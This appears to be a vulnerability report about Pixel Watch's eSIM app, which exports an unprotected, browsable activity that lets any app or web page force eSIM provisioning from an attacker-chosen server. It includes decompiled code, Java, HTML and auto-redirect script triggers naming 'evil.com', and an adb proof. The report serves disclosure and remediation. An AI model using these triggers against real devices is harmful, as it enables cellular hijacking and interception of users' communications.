# VRP Report #43: EuiccWear LPA:// Scheme — Zero-Permission eSIM Provisioning Trigger

## Summary
Google's EuiccWear app (`com.google.android.euicc.wear`) exports `QrDownloadActivity` with **no permission requirement** and **BROWSABLE** category, allowing any app — or a malicious web page — to trigger the eSIM profile provisioning flow on Pixel Watch. The attacker controls the LPA activation code URI, which specifies the SM-DP+ server address for eSIM profile download. The flow chain sets `FORCE_PROVISION=true` and `isDownloadFlowFromOtherApps=true` on the resulting `ActivationActivity`, initiating carrier provisioning with an attacker-controlled activation code.

## Affected Component

| Component | Package | Exported | Permission | Categories |
|-----------|---------|----------|------------|------------|
| `QrDownloadActivity` | `com.google.android.euicc.wear` | **true** | **NONE** | DEFAULT, **BROWSABLE** |

### Manifest Entry
```xml
<activity android:exported="true"
    android:name="com.android.euicc.ui.activation.QrDownloadActivity"
    android:parentActivityName="com.android.euicc.ui.activation.ActivationActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="LPA"/>
    </intent-filter>
</activity>
```

## Vulnerability Details

### Attack Chain

1. **QrDownloadActivity.onCreate()** receives `ACTION_VIEW` with `LPA://` URI:
   ```java
   if (intent.getAction().equals("android.intent.action.VIEW")) {
       Intent intent2 = new Intent(this, CurrentSuwInitActivity.class);
       intent2.putExtra("download_flow_from_other_apps", true);
       intent2.putExtra("activation_code", intent.getDataString());  // ATTACKER-CONTROLLED
       startActivity(intent2);
       finish();
   }
   ```

2. **CurrentSuwInitActivity.onCreate()** detects the `download_flow_from_other_apps` extra:
   ```java
   if (r8.hasExtra("download_flow_from_other_apps")) {
       // "Caller is from other apps. Go to activation flow"
       r8.putExtra("DISABLE_PROV_PROFILE", true);
       r8.putExtra("FORCE_PROVISION", true);  // FORCED PROVISIONING
       startActivationActivity(this, r8);
   }
   ```

3. **ActivationActivity.onCreate()** processes with `forceProvision=true`:
   - `isDownloadFlowFromOtherApps=true` → Creates `CarrierInfo` with `downloadType=3` (QR scan type)
   - Starts `PreActivationActivity` → `DownloadActivity` with the attacker-controlled activation code
   - The activation code is passed to `DownloadableSubscription.forActivationCode()` for eSIM profile fetch

### LPA URI Format
LPA (Local Profile Assistant) URIs follow the GSMA format:
```
LPA:1$<SM-DP+ server address>$<matching ID>
```
Example: `LPA:1$evil-smdp.example.com$attacker-profile-id`

The attacker controls the SM-DP+ server address, meaning the device will attempt to connect to an attacker-controlled server for eSIM profile provisioning.

### Attack Vectors

1. **Malicious App (zero-permission)**: Any installed app can send:
   ```java
   Intent intent = new Intent(Intent.ACTION_VIEW);
   intent.setData(Uri.parse("LPA:1$evil.com$malicious"));
   startActivity(intent);
   ```

2. **Web-based (zero-click)**: The BROWSABLE category allows web pages to trigger:
   ```html
   <a href="LPA:1$evil.com$malicious">Tap to activate</a>
   <!-- Or via auto-redirect -->
   <script>window.location = "LPA:1$evil.com$malicious";</script>
   ```

3. **NFC tag**: Physical NFC tags with `LPA://` URIs could trigger this on proximity

## Dynamic Proof (Pixel Watch 2)

### Command:
```
adb shell am start -a android.intent.action.VIEW \
    -d "LPA:1" \
    -c android.intent.category.DEFAULT \
    -c android.intent.category.BROWSABLE
```

### Result (logcat):
```
I ActivityTaskManager: START u0 {act=android.intent.action.VIEW
    cat=[android.intent.category.DEFAULT,android.intent.category.BROWSABLE]
    dat=LPA:
    cmp=com.google.android.euicc.wear/com.android.euicc.ui.activation.QrDownloadActivity}
    with LAUNCH_MULTIPLE from uid 2000 (com.android.shell) (BAL_ALLOW_PERMISSION) result code=0

I Euicc: activity is launched with action view

I Euicc: onCreate: inSetupWizard = false,
    forceProvision = true,
    activationType = 1,
    isDownloadFlowFromOtherApps = true,
    isExtraForProvProfile = false
```

### Activity Stack (from WindowManager):
```
baseIntent=Intent { act=android.intent.action.VIEW dat=LPA:
    cmp=com.google.android.euicc.wear/com.android.euicc.ui.activation.QrDownloadActivity }
topActivity=ComponentInfo{com.google.android.euicc.wear/com.android.euicc.ui.activation.ActivationActivity}
numActivities=3
```
Confirms the full chain: QrDownloadActivity → CurrentSuwInitActivity → ActivationActivity

## Impact

### Cellular Network Hijacking (HIGH)
If the user taps through the provisioning UI (which is small and potentially confusing on a watch's 384x384 screen), the watch could:
- Download and install an attacker-controlled eSIM profile
- Route ALL cellular calls and data through the attacker's network (MITM)
- Replace the user's existing cellular connection
- Enable remote tracking and interception of communications

### Denial of Service (MEDIUM)
- Repeatedly triggering the eSIM provisioning flow disrupts normal watch usage
- Each trigger launches a full activity stack that covers the entire watch screen
- The `FORCE_PROVISION=true` flag indicates forced provisioning behavior
- `DISABLE_PROV_PROFILE=true` may disable existing provisioning profiles

### Social Engineering Amplification (HIGH on Watch)
- Watch screen is 384x384 pixels — extremely limited UI real estate
- Users cannot easily read or understand complex provisioning dialogs
- The flow is identical to legitimate carrier activation, providing no visual warning
- Web-triggered attacks require only visiting a malicious page on a connected phone

### Permission Model Failure
- **QrDownloadActivity**: exported=true, NO permission → any app/web page can trigger
- **CurrentSuwInitActivity**: has `BIND_EUICC_SERVICE` permission → BUT bypassed by internal call from QrDownloadActivity
- The permission on CurrentSuwInitActivity only protects against DIRECT external access; the QrDownloadActivity entry point completely circumvents it

## Root Cause
`QrDownloadActivity` was designed to handle QR-scanned LPA URIs but is also registered as a BROWSABLE handler for the `LPA://` scheme. It should either:
1. Require a permission (e.g., `BIND_EUICC_SERVICE`) for external callers
2. Remove the BROWSABLE category to prevent web-triggered attacks
3. Validate that the calling context is the built-in QR scanner, not an arbitrary app
4. Not pass `FORCE_PROVISION=true` when triggered by external apps

## Device / Build
- Pixel Watch 2 (3A101RTJWRGCV9), Wear OS, Build CP2A.260603.001
- EuiccWear (`com.google.android.euicc.wear`) version as bundled at `/system/priv-app/EuiccWearPrebuilt/EuiccWearPrebuilt.apk`
- Also potentially affects Pixel phones with `com.google.android.euicc` (needs verification)
